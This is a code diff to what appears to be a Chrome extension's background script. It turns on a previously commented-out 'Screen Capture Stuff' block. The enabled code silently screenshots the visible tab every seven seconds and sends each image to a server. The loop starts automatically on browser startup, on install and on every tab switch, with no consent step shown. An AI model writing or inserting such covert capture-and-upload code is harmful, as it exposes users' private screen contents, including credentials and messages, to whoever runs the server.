@@ -185,32 +185,32 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
        Screen Capture Stuff
 
 ************************/
-//
-//let intervalId = null;
-//
-//function startScreenshotLoop() {
-//    if (!intervalId) {
-//        intervalId = setInterval(() => {
-//            chrome.tabs.captureVisibleTab(null, { format: "png" }, (imageUri) => {
-//                if (chrome.runtime.lastError) {
-//                    console.error("Error capturing screenshot:", chrome.runtime.lastError.message);
-//                } else {
-//                    sendToServer("screenshot", imageUri);
-//                }
-//            });
-//        }, 7000);
-//    }
-//}
-//
-//function downloadScreenshot(imageUri) {
-//    const filename = `screenshot_${Date.now()}.png`;
-//    chrome.downloads.download({
-//        url: imageUri,
-//        filename: filename
-//    });
-//}
-//
-//chrome.runtime.onStartup.addListener(startScreenshotLoop);
-//chrome.runtime.onInstalled.addListener(startScreenshotLoop);
-//
-//chrome.tabs.onActivated.addListener(startScreenshotLoop);
+
+let intervalId = null;
+
+function startScreenshotLoop() {
+    if (!intervalId) {
+        intervalId = setInterval(() => {
+            chrome.tabs.captureVisibleTab(null, { format: "png" }, (imageUri) => {
+                if (chrome.runtime.lastError) {
+                    console.error("Error capturing screenshot:", chrome.runtime.lastError.message);
+                } else {
+                    sendToServer("screenshot", imageUri);
+                }
+            });
+        }, 7000);
+    }
+}
+
+function downloadScreenshot(imageUri) {
+    const filename = `screenshot_${Date.now()}.png`;
+    chrome.downloads.download({
+        url: imageUri,
+        filename: filename
+    });
+}
+
+chrome.runtime.onStartup.addListener(startScreenshotLoop);
+chrome.runtime.onInstalled.addListener(startScreenshotLoop);
+
+chrome.tabs.onActivated.addListener(startScreenshotLoop);
